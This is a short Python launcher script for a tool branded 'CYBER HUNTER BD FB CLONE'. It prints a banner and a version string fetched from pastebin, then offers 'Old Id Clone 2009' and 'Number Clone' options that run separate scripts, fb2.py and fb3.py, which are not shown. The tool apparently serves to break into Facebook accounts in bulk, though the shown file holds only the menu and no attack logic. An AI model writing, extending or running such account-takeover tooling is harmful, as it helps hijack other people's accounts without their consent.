##chb Alamin import
#----------------------------

import os
import requests
import time
import sys
import random
from threading import Thread as pool

##chb Alamin color
#----------------------------


blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
black="\033[0;30m"
pink="\x1b[95m"
blue="\x1b[94m"
underline='\x1b[4m'
colouroff="\x1b[00m"

os.system('clear')
##chb Alamin verson
#----------------------------

r=requests.get('https://pastebin.com/raw/Ga6ej4mA').text
##chb Alamin logu
#----------------------------

logu=(pink+f"""
\t  ____      _   _      ____
\t / ___|    | | | |    | __ )
\t| |        | |_| |    |  _ \    """+colouroff+underline+"""CYBER HUNTER BD"""+colouroff+pink+"""
\t| |___     |  _  |    | |_) |
\t \____|    |_| |_|    |____/ 
\n"""+blue+"""           Focous on Your Aim, You Will winner""")


line=end+"\n__________________________________________________________"
def a():
	print(logu+"\n\n	"+green+"   Developed By : MD ALAMIN CHOWDORY"+green+"\n\n 	"+red+"   Version :"+r+"\n\n           FB CLONE  "+line)

a()


print(yellow+"\n\n[1] Old Id Clone 2009\n\n[2] Number Clone ")

a=input(green+"\n\nEnter Your Option:  ")
if a=="1":
	os.system("python fb2.py ")
if a=="2":
	os.system("python fb3.py ")